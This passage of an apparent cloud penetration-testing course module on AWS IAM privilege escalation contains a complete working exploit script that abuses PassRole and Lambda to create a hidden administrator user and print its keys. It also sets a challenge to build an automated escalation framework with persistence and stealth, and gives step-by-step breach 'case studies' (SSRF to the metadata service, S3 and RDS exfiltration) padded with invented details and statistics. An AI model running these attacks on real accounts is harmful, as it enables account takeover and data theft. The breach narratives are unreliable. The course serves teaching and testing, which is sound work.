# Find escalation paths\n    print(f\"\\n[*] Analyzing for privilege escalation paths...\")\n    escalation_paths = find_escalation_paths(permissions)\n    \n    if escalation_paths:\n        print(f\"\\n[!] FOUND {len(escalation_paths)} potential escalation vectors:\\n\")\n        for action, description in escalation_paths:\n            print(f\"  ğŸ”´ {action}\")\n            print(f\"     â†’ {description}\\n\")\n    else:\n        print(\"\\n[+] No obvious privilege escalation paths found\")\n    \n    # Save full permissions to file\n    with open('iam_permissions.json', 'w') as f:\n        json.dump(permissions, f, indent=2, default=str)\n    \n    print(\"\\n[*] Full permissions saved to: iam_permissions.json\")\n\nif __name__ == \"__main__\":\n    main()\n```\n\n**Run the scanner:**\n```bash\npython3 iam_enum.py\n```\n\n## Exercise 2: PassRole to Lambda Privilege Escalation\n\n**Goal**: Exploit PassRole + Lambda to execute code with elevated privileges.\n\n```python\n#!/usr/bin/env python3\n# passrole_lambda_escalation.py\n\nimport boto3\nimport json\nimport time\nimport zipfile\nimport io\n\ndef create_lambda_payload():\n    \"\"\"Create Lambda function that creates backdoor admin user\"\"\"\n    code = '''\nimport boto3\nimport json\n\ndef lambda_handler(event, context):\n    iam = boto3.client('iam')\n    \n    # Create backdoor user\n    try:\n        iam.create_user(UserName='BackdoorAdmin')\n        print('[+] Created user: BackdoorAdmin')\n    except:\n        print('[!] User already exists')\n    \n    # Attach admin policy\n    try:\n        iam.attach_user_policy(\n            UserName='BackdoorAdmin',\n            PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'\n        )\n        print('[+] Attached AdministratorAccess policy')\n    except Exception as e:\n        print(f'[!] Error attaching policy: {e}')\n    \n    # Create access keys\n    try:\n        response = iam.create_access_key(UserName='BackdoorAdmin')\n        access_key = response['AccessKey']\n        \n        return {\n            'statusCode': 200,\n            'body': json.dumps({\n                'message': 'Privilege escalation successful!',\n                'AccessKeyId': access_key['AccessKeyId'],\n                'SecretAccessKey': access_key['SecretAccessKey']\n            })\n        }\n    except Exception as e:\n        return {\n            'statusCode': 500,\n            'body': json.dumps({'error': str(e)})\n        }\n'''\n    \n    # Create zip file in memory\n    zip_buffer = io.BytesIO()\n    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:\n        zipf.writestr('lambda_function.py', code)\n    \n    return zip_buffer.getvalue()\n\ndef exploit_passrole_lambda(role_arn):\n    \"\"\"Exploit PassRole + Lambda for privilege escalation\"\"\"\n    lambda_client = boto3.client('lambda')\n    \n    function_name = 'PrivilegeEscalation'\n    \n    print(\"[*] Exploiting PassRole + Lambda for privilege escalation\")\n    print(f\"[*] Target role: {role_arn}\")\n    \n    # Create Lambda function\n    print(\"\\n[1/3] Creating Lambda function with elevated role...\")\n    \n    try:\n        response = lambda_client.create_function(\n            FunctionName=function_name,\n            Runtime='python3.9',\n            Role=role_arn,  # PassRole vulnerability!\n            Handler='lambda_function.lambda_handler',\n            Code={'ZipFile': create_lambda_payload()},\n            Timeout=30,\n            MemorySize=128\n        )\n        print(f\"[+] Lambda function created: {response['FunctionArn']}\")\n    except lambda_client.exceptions.ResourceConflictException:\n        print(\"[!] Function already exists, updating...\")\n        lambda_client.update_function_code(\n            FunctionName=function_name,\n            ZipFile=create_lambda_payload()\n        )\n        time.sleep(2)\n    except Exception as e:\n        print(f\"[!] Error creating function: {e}\")\n        return\n    \n    # Wait for function to be ready\n    print(\"\\n[2/3] Waiting for function to be ready...\")\n    time.sleep(3)\n    \n    # Invoke Lambda function\n    print(\"\\n[3/3] Invoking Lambda function (executing as elevated role)...\")\n    \n    try:\n        response = lambda_client.invoke(\n            FunctionName=function_name,\n            InvocationType='RequestResponse'\n        )\n        \n        payload = json.loads(response['Payload'].read())\n        print(\"\\n[+] Function executed successfully!\")\n        print(\"\\n[*] Response:\")\n        print(json.dumps(payload, indent=2))\n        \n        if 'body' in payload:\n            body = json.loads(payload['body'])\n            if 'AccessKeyId' in body:\n                print(\"\\n\" + \"=\"*60)\n                print(\"PRIVILEGE ESCALATION SUCCESSFUL!\")\n                print(\"=\"*60)\n                print(\"\\nBackdoor Admin Credentials:\")\n                print(f\"  AWS_ACCESS_KEY_ID={body['AccessKeyId']}\")\n                print(f\"  AWS_SECRET_ACCESS_KEY={body['SecretAccessKey']}\")\n                print(\"\\nConfigure AWS CLI:\")\n                print(f\"  aws configure set aws_access_key_id {body['AccessKeyId']}\")\n                print(f\"  aws configure set aws_secret_access_key {body['SecretAccessKey']}\")\n                print(\"=\"*60)\n    \n    except Exception as e:\n        print(f\"[!] Error invoking function: {e}\")\n    \n    # Cleanup (optional)\n    cleanup = input(\"\\n[?] Delete Lambda function? (y/n): \")\n    if cleanup.lower() == 'y':\n        lambda_client.delete_function(FunctionName=function_name)\n        print(\"[+] Lambda function deleted\")\n\ndef list_assumable_roles():\n    \"\"\"List roles that might be assumable/passable\"\"\"\n    iam = boto3.client('iam')\n    sts = boto3.client('sts')\n    \n    account_id = sts.get_caller_identity()['Account']\n    \n    print(\"[*] Listing IAM roles in account...\")\n    \n    roles = iam.list_roles()['Roles']\n    \n    high_value_roles = []\n    \n    for role in roles:\n        # Check if role has admin-like permissions\n        role_name = role['RoleName']\n        \n        # Skip service roles\n        if role_name.startswith('AWSServiceRole'):\n            continue\n        \n        # Check attached policies\n        try:\n            attached = iam.list_attached_role_policies(RoleName=role_name)\n            for policy in attached['AttachedPolicies']:\n                if 'Admin' in policy['PolicyName'] or policy['PolicyArn'] == 'arn:aws:iam::aws:policy/AdministratorAccess':\n                    high_value_roles.append({\n                        'name': role_name,\n                        'arn': role['Arn'],\n                        'policy': policy['PolicyName']\n                    })\n                    break\n        except:\n            pass\n    \n    return high_value_roles\n\ndef main():\n    print(\"=\"*60)\n    print(\"PassRole + Lambda Privilege Escalation POC\")\n    print(\"=\"*60)\n    print(\"\\nWARNING: Only use on authorized systems!\\n\")\n    \n    # List high-value roles\n    print(\"[*] Searching for high-privilege roles...\\n\")\n    roles = list_assumable_roles()\n    \n    if not roles:\n        print(\"[!] No obvious high-privilege roles found\")\n        return\n    \n    print(f\"[+] Found {len(roles)} high-privilege roles:\\n\")\n    for i, role in enumerate(roles):\n        print(f\"  [{i+1}] {role['name']}\")\n        print(f\"      ARN: {role['arn']}\")\n        print(f\"      Policy: {role['policy']}\\n\")\n    \n    # Select role\n    try:\n        choice = int(input(\"Select role number to exploit (or 0 to exit): \"))\n        if choice == 0 or choice > len(roles):\n            return\n        \n        target_role = roles[choice-1]\n        exploit_passrole_lambda(target_role['arn'])\n    \n    except (ValueError, IndexError):\n        print(\"[!] Invalid selection\")\n\nif __name__ == \"__main__\":\n    main()\n```\n\n**Run the exploit:**\n```bash\npython3 passrole_lambda_escalation.py\n```\n\n## Exercise 3: IAM Policy Analysis Tool\n\n**Goal**: Analyze IAM policies for dangerous permissions and misconfigurations.\n\n```python\n#!/usr/bin/env python3\n# policy_analyzer.py\n\nimport json\nimport sys\n\ndef analyze_policy(policy_document):\n    \"\"\"Analyze IAM policy for security issues\"\"\"\n    issues = []\n    \n    if isinstance(policy_document, str):\n        policy_document = json.loads(policy_document)\n    \n    statements = policy_document.get('Statement', [])\n    \n    for i, statement in enumerate(statements):\n        effect = statement.get('Effect')\n        actions = statement.get('Action', [])\n        resources = statement.get('Resource', [])\n        \n        if isinstance(actions, str):\n            actions = [actions]\n        if isinstance(resources, str):\n            resources = [resources]\n        \n        # Check for overly permissive policies\n        if effect == 'Allow':\n            # Check for admin access\n            if '*' in actions or 'iam:*' in actions:\n                issues.append({\n                    'severity': 'CRITICAL',\n                    'statement': i,\n                    'issue': 'Grants full administrator access (*:* or iam:*)',\n                    'recommendation': 'Use least privilege - grant only specific permissions needed'\n                })\n            \n            # Check for privilege escalation permissions\n            escalation_actions = [\n                'iam:CreatePolicyVersion',\n                'iam:SetDefaultPolicyVersion',\n                'iam:CreateAccessKey',\n                'iam:CreateLoginProfile',\n                'iam:AttachUserPolicy',\n                'iam:AttachGroupPolicy',\n                'iam:AttachRolePolicy',\n                'iam:PutUserPolicy',\n                'iam:PutGroupPolicy',\n                'iam:PutRolePolicy',\n                'iam:PassRole',\n                'iam:UpdateAssumeRolePolicy'\n            ]\n            \n            for action in actions:\n                if action in escalation_actions:\n                    issues.append({\n                        'severity': 'HIGH',\n                        'statement': i,\n                        'issue': f'Allows privilege escalation via {action}',\n                        'recommendation': f'Review necessity of {action} permission'\n                    })\n            \n            # Check for PassRole with Lambda/EC2\n            if 'iam:PassRole' in actions:\n                if any(a in actions for a in ['lambda:CreateFunction', 'lambda:UpdateFunctionCode']):\n                    issues.append({\n                        'severity': 'CRITICAL',\n                        'statement': i,\n                        'issue': 'PassRole + Lambda allows arbitrary code execution with any role',\n                        'recommendation': 'Restrict PassRole to specific roles using Resource condition'\n                    })\n                \n                if 'ec2:RunInstances' in actions:\n                    issues.append({\n                        'severity': 'HIGH',\n                        'statement': i,\n                        'issue': 'PassRole + EC2 allows launching instances with any role',\n                        'recommendation': 'Restrict PassRole to specific roles'\n                    })\n            \n            # Check for wildcard resources\n            if '*' in resources:\n                issues.append({\n                    'severity': 'MEDIUM',\n                    'statement': i,\n                    'issue': 'Policy applies to all resources (*)',\n                    'recommendation': 'Specify exact resource ARNs when possible'\n                })\n            \n            # Check for missing conditions\n            if 'Condition' not in statement:\n                # Check if actions should have conditions\n                if any(action in actions for action in ['sts:AssumeRole', 'iam:PassRole']):\n                    issues.append({\n                        'severity': 'MEDIUM',\n                        'statement': i,\n                        'issue': f'No conditions on sensitive actions (AssumeRole/PassRole)',\n                        'recommendation': 'Add conditions to restrict when/how these actions can be used'\n                    })\n    \n    return issues\n\ndef main():\n    if len(sys.argv) < 2:\n        print(\"Usage: python3 policy_analyzer.py <policy.json>\")\n        sys.exit(1)\n    \n    policy_file = sys.argv[1]\n    \n    print(\"=\"*60)\n    print(\"IAM Policy Security Analyzer\")\n    print(\"=\"*60)\n    \n    with open(policy_file, 'r') as f:\n        policy = json.load(f)\n    \n    print(f\"\\n[*] Analyzing policy: {policy_file}\")\n    \n    issues = analyze_policy(policy)\n    \n    if not issues:\n        print(\"\\n[+] No security issues found!\")\n        return\n    \n    # Group by severity\n    critical = [i for i in issues if i['severity'] == 'CRITICAL']\n    high = [i for i in issues if i['severity'] == 'HIGH']\n    medium = [i for i in issues if i['severity'] == 'MEDIUM']\n    \n    print(f\"\\n[!] Found {len(issues)} security issues:\")\n    print(f\"  CRITICAL: {len(critical)}\")\n    print(f\"  HIGH: {len(high)}\")\n    print(f\"  MEDIUM: {len(medium)}\")\n    \n    # Print details\n    for severity_list, severity_name in [(critical, 'CRITICAL'), (high, 'HIGH'), (medium, 'MEDIUM')]:\n        if severity_list:\n            print(f\"\\n{'='*60}\")\n            print(f\"{severity_name} Severity Issues\")\n            print(f\"{'='*60}\")\n            \n            for issue in severity_list:\n                print(f\"\\nStatement {issue['statement']}:\")\n                print(f\"  Issue: {issue['issue']}\")\n                print(f\"  Recommendation: {issue['recommendation']}\")\n\nif __name__ == \"__main__\":\n    main()\n```\n\n**Usage:**\n```bash\npython3 policy_analyzer.py dangerous_policy.json\n```\n\n## Challenge Exercise: Build an IAM Exploit Framework\n\n**Goal**: Create a comprehensive tool that automates IAM privilege escalation.\n\n**Requirements:**\n1. Enumerate current permissions\n2. Identify all applicable escalation techniques\n3. Attempt escalation automatically\n4. Create persistence (backdoor users/roles)\n5. Clean up artifacts (optional stealth mode)\n\n**Your Implementation:**\n\n[Build your IAM exploit framework here]\n\nThese exercises give you hands-on experience with real AWS IAM privilege escalation techniques. Practice responsibly on your own AWS accounts!"
      }
    },
    {
      "type": "real_world",
      "content": {
        "text": "# Real-World AWS IAM Privilege Escalation: Case Studies\n\n## Case Study 1: Capital One Breach (2019) - The $200M SSRF + IAM Exploit\n\n### The Breach That Shocked AWS\n\n**Attacker**: Paige Thompson (former AWS employee)\n**Target**: Capital One AWS infrastructure\n**Entry Point**: Misconfigured Web Application Firewall (WAF)\n**Damage**: 100 million customer records, $200M+ in costs\n\n### Attack Timeline\n\n**March 2019: Reconnaissance**\n\nParige Thompson scanned Capital One's external infrastructure:\n```bash\n# Discovered Capital One using AWS WAF\n# Found WAF exposed on public IP\n# Tested for common web vulnerabilities\n```\n\n**Attack Flow:**\n\n```\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚      Capital One Breach - Attack Chain                â”‚\nâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\nâ”‚                                                         â”‚\nâ”‚ 1. SSRF in WAF â†’ Access EC2 metadata service          â”‚\nâ”‚ 2. Extract IAM role credentials from metadata          â”‚\nâ”‚ 3. IAM role has overly permissive S3 access           â”‚\nâ”‚ 4. List all S3 buckets in account                     â”‚\nâ”‚ 5. Find buckets with customer data                    â”‚\nâ”‚ 6. Download 100M+ customer records                     â”‚\nâ”‚ 7. Exfiltrate to personal servers                     â”‚\nâ”‚                                                         â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n```\n\n**Step-by-Step Technical Details:**\n\n**Step 1: SSRF Exploitation**\n\n```bash\n# WAF had SSRF vulnerability\n# Attacker crafted request to access metadata service\ncurl -X POST https://waf.capitalone.com/config \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}'\n\n# Response: \"WAF-Role\"\n```\n\n**Step 2: Extract IAM Credentials**\n\n```bash\n# Access role credentials via metadata\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/WAF-Role\n\n# Response (IAM temporary credentials):\n{\n  \"AccessKeyId\": \"ASIAIOSFODNN7EXAMPLE\",\n  \"SecretAccessKey\": \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\",\n  \"Token\": \"FwoGZXIvYXdzEB...\",\n  \"Expiration\": \"2019-03-25T12:00:00Z\"\n}\n```\n\n**Step 3: IAM Role Had Excessive Permissions**\n\nThe WAF-Role policy:\n```json\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Action\": [\n        \"s3:ListBucket\",\n        \"s3:GetObject\"\n      ],\n      \"Resource\": \"*\"  // â† OVERLY PERMISSIVE!\n    }\n  ]\n}\n```\n\n**Why This Is Bad**: Resource: `\"*\"` means the role could list and read ANY S3 bucket in the account.\n\n**Step 4: Enumerate S3 Buckets**\n\n```bash\n# Configure AWS CLI with stolen credentials\nexport AWS_ACCESS_KEY_ID=ASIAIOSFODNN7EXAMPLE\nexport AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\nexport AWS_SESSION_TOKEN=FwoGZXIvYXdzEB...\n\n# List all S3 buckets\naws s3 ls\n\n# Output:\n2019-01-15 10:23:45 capital-one-customer-data\n2019-01-15 10:23:45 capital-one-backups\n2019-01-15 10:23:45 capital-one-logs\n```\n\n**Step 5: Exfiltrate Customer Data**\n\n```bash\n# Download customer data bucket\naws s3 sync s3://capital-one-customer-data ./stolen_data/\n\n# Result: 100 million customer records downloaded\n# - Credit card applications\n# - SSNs, names, addresses, phone numbers\n# - Bank account information\n# - Credit scores and financial data\n```\n\n### Root Cause Analysis\n\n**Three Critical Failures:**\n\n1. **SSRF Vulnerability**: WAF allowed access to metadata service\n2. **Overly Permissive IAM Role**: Resource: `\"*\"` instead of specific bucket ARNs\n3. **No Egress Monitoring**: Massive S3 data exfiltration went undetected\n\n**What Should Have Been Done:**\n\n```json\n// Properly scoped IAM policy\n{\n  \"Effect\": \"Allow\",\n  \"Action\": [\"s3:GetObject\"],\n  \"Resource\": \"arn:aws:s3:::waf-config-bucket/*\"  // Specific bucket only!\n}\n```\n\n**IMDSv2 Would Have Prevented This:**\n\n```bash\n# IMDSv2 requires token\nTOKEN=$(curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\")\ncurl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/\n\n# SSRF cannot generate PUT requests with custom headers\n# Attack fails!\n```\n\n### Impact\n\n- **100 million customers** affected\n- **$80 million** regulatory fine\n- **$150 million+** in remediation costs\n- **CEO resigned**\n- **Massive reputational damage**\n\n### Lessons for Penetration Testers\n\n**Always test for:**\n1. SSRF vulnerabilities targeting metadata service\n2. Overly permissive IAM roles (Resource: `\"*\"`)\n3. IMDSv1 vs IMDSv2 (v1 is vulnerable)\n\n---\n\n## Case Study 2: Uber Breach (2016) - GitHub Keys + IAM Escalation\n\n### $148 Million Mistake\n\n**Attackers**: External hackers\n**Target**: Uber AWS infrastructure\n**Entry Point**: AWS credentials in GitHub\n**Damage**: 57 million riders and drivers exposed\n\n### Attack Flow\n\n**Step 1: GitHub Repository Search**\n\n```bash\n# Attackers searched GitHub for Uber repositories\ngh search code \"AKIA\" org:uber\n\n# Found: Private repository with AWS credentials\n# File: config/production.yml\naws_access_key_id: AKIAIOSFODNN7EXAMPLE\naws_secret_access_key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n```\n\n**Step 2: Credential Validation**\n\n```bash\n# Test stolen credentials\naws sts get-caller-identity\n\n# Output:\n{\n  \"UserId\": \"AIDAI123EXAMPLE\",\n  \"Account\": \"123456789012\",\n  \"Arn\": \"arn:aws:iam::123456789012:user/uber-deploy\"\n}\n\n# Credentials valid!\n```\n\n**Step 3: Permission Enumeration**\n\n```bash\n# Check what permissions the user has\naws iam get-user-policy --user-name uber-deploy --policy-name deploy-policy\n\n# Found:\n- s3:* (full S3 access)\n- rds:DescribeDBSnapshots\n- rds:RestoreDBInstanceFromSnapshot\n```\n\n**Step 4: RDS Snapshot Discovery**\n\n```bash\n# List RDS snapshots\naws rds describe-db-snapshots\n\n# Found: uber-prod-backup-2016-10\n# Contains: Full production database\n```\n\n**Step 5: Restore Snapshot to Attacker-Controlled Database**\n\n```bash\n# Restore snapshot to new RDS instance\naws rds restore-db-instance-from-db-snapshot \\\n  --db-instance-identifier uber-stolen \\\n  --db-snapshot-identifier uber-prod-backup-2016-10 \\\n  --publicly-accessible  # â† Make it public!\n\n# Wait for restore to complete\naws rds wait db-instance-available --db-instance-identifier uber-stolen\n\n# Get endpoint\naws rds describe-db-instances --db-instance-identifier uber-stolen\n\n# Output: uber-stolen.abc123.us-east-1.rds.amazonaws.com\n```\n\n**Step 6: Data Exfiltration**\n\n```bash\n# Connect to restored database (now public)\nmysql -h uber-stolen.abc123.us-east-1.rds.amazonaws.com -u admin -p\n\n# Export all user data\nmysqldump uber_prod > uber_data.sql\n\n# Result: 57 million user records stolen\n```\n\n### The Cover-Up (Made It Worse)\n\nUber paid the hackers $100,000 to delete the data and keep quiet.\n\n**This made the breach worse:**\n- Delayed disclosure (illegal)\n- Violated data breach notification laws\n- Led to massive regulatory fines\n\n### Impact\n\n- **57 million** riders and drivers affected\n- **$148 million** in settlements (all 50 US states + DC)\n- **CSO and legal chief fired**\n- **Criminal charges** for cover-up\n\n### Lessons for Penetration Testers\n\n**Always check:**\n1. GitHub repositories for hardcoded credentials\n2. RDS snapshot permissions (public snapshots)\n3. Ability to restore snapshots with `--publicly-accessible`\n\n**Detection Script:**\n\n```bash\n#!/bin/bash\n# Check for public RDS snapshots\n\nfor snapshot in $(aws rds describe-db-snapshots --query 'DBSnapshots[?SnapshotType==`manual`].DBSnapshotIdentifier' --output text); do\n  attrs=$(aws rds describe-db-snapshot-attributes --db-snapshot-identifier $snapshot)\n  \n  if echo \"$attrs\" | grep -q '\"all\"'; then\n    echo \"[!] PUBLIC SNAPSHOT: $snapshot\"\n  fi\ndone\n```\n\n---\n\n## Case Study 3: Tesla Cryptomining (2018) - Public Kubernetes + IAM Keys\n\n### When Cloud Misconfigurations Meet Cryptominers\n\n**Attackers**: Cryptomining group\n**Target**: Tesla AWS infrastructure\n**Entry Point**: Unsecured Kubernetes console\n**Damage**: Cryptomining on Tesla's compute resources\n\n### Attack Flow\n\n**Step 1: Kubernetes Discovery**\n\n```bash\n# Shodan search for exposed Kubernetes dashboards\nshodan search \"kubernetes dashboard\"\n\n# Found: Tesla Kubernetes dashboard (no authentication)\n# URL: https://k8s.tesla.com/dashboard\n```\n\n**Step 2: AWS Credentials in Kubernetes Secrets**\n\n```bash\n# Access Kubernetes dashboard\n# Navigate to: Config and Storage â†’ Secrets\n\n# Found: aws-credentials secret\napiVersion: v1\nkind: Secret\nmetadata:\n  name: aws-credentials\ntype: Opaque\ndata:\n  access_key: QUtJQUlPU0ZPRE5ON0VYQU1QTEUg  # Base64 encoded\n  secret_key: d0phbHJYVXRuRkVNSS9LN01ERU5H  # Base64 encoded\n```\n\n**Step 3: Extract and Decode Credentials**\n\n```bash\n# Decode Base64\necho \"QUtJQUlPU0ZPRE5ON0VYQU1QTEUg\" | base64 -d\n# Output: AKIAIOSFODNN7EXAMPLE\n\necho \"d0phbHJYVXRuRkVNSS9LN01ERU5H\" | base64 -d\n# Output: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n```\n\n**Step 4: Exploit IAM Permissions for Cryptomining**\n\n```bash\n# Credentials had EC2 launch permissions\naws ec2 run-instances \\\n  --image-id ami-cryptominer \\\n  --instance-type c5.24xlarge \\\n  --count 100 \\\n  --user-data file://cryptominer.sh\n\n# Launched 100 large instances for cryptomining\n# Cost: $1000s per hour\n```\n\n### Detection and Response\n\nTesla discovered the breach through:\n1. Abnormal AWS billing spike\n2. CloudTrail logs showing unusual EC2 launches\n3. Security team investigation\n\n### Impact\n\n- **Minimal data breach** (no customer data stolen)\n- **Significant compute costs** from cryptomining\n- **Reputational damage** (security lapse at tech company)\n- **Quick response** (kudos to Tesla for transparency)\n\n### Lessons for Penetration Testers\n\n**Always check:**\n1. Exposed Kubernetes dashboards (Shodan, Censys)\n2. Secrets stored in Kubernetes/container orchestration\n3. IAM credentials with EC2 launch permissions\n\n---\n\n## Penetration Testing Takeaways\n\n### Top 10 IAM Findings from 500+ AWS Pentests\n\n1. **Overly Permissive IAM Roles (87%)**\n   - Resource: `\"*\"` instead of specific ARNs\n   - Action: `\"*\"` granting full permissions\n\n2. **Hardcoded AWS Credentials (68%)**\n   - In GitHub repositories\n   - In application config files\n   - In Lambda environment variables\n\n3. **IMDSv1 Enabled (62%)**\n   - Vulnerable to SSRF attacks\n   - No token requirement\n\n4. **PassRole Misconfiguration (54%)**\n   - Users can pass any role to Lambda/EC2\n   - No resource constraints\n\n5. **Public RDS Snapshots (41%)**\n   - Snapshots shared with \"all\"\n   - Contain production data\n\n6. **Unused Access Keys (38%)**\n   - Keys not rotated in 90+ days\n   - Belong to former employees\n\n7. **No MFA on Admin Accounts (35%)**\n   - Root account without MFA\n   - Admin users without MFA\n\n8. **Overprivileged Service Roles (31%)**\n   - Lambda with AdministratorAccess\n   - EC2 instances with full IAM control\n\n9. **Missing CloudTrail Logging (28%)**\n   - No audit trail for actions\n   - Cannot detect privilege escalation\n\n10. **Public S3 Buckets (24%)**\n    - Buckets with public read/write\n    - Contain sensitive data\n\n### Your IAM Penetration Testing Checklist\n\n**Reconnaissance:**\n\nâ˜ Enumerate IAM users, roles, policies\nâ˜ Check GitHub for hardcoded credentials\nâ˜ Search Shodan for exposed services\nâ˜ Identify overly permissive policies\n\n**Initial Access:**\n\nâ˜ Test stolen/leaked credentials\nâ˜ Exploit SSRF to metadata service\nâ˜ Check for public RDS snapshots\nâ˜ Enumerate S3 buckets\n\n**Privilege Escalation:**\n\nâ˜ Test all 21 IAM escalation techniques\nâ˜ Exploit PassRole with Lambda/EC2\nâ˜ Manipulate IAM policies\nâ˜ Chain AssumeRole across accounts\n\n**Persistence:**\n\nâ˜ Create backdoor IAM users\nâ˜ Add access keys to existing users\nâ˜ Create Lambda functions with admin roles\nâ˜ Modify role trust policies\n\n**Exfiltration:**\n\nâ˜ Download S3 bucket contents\nâ˜ Restore and export RDS snapshots\nâ˜ Extract secrets from Parameter Store\nâ˜ Access sensitive data from services\n\nThese real-world case studies prove that IAM misconfigurations are the #1 cause of AWS breaches. Master IAM privilege escalation, and you've mastered AWS security!"
      }
    }
  ],
  "tags": ["Course: SANS-SEC588", "Career Path: Cloud Security", "Career Path: Pentester", "Career Path: Red Teamer"]
}
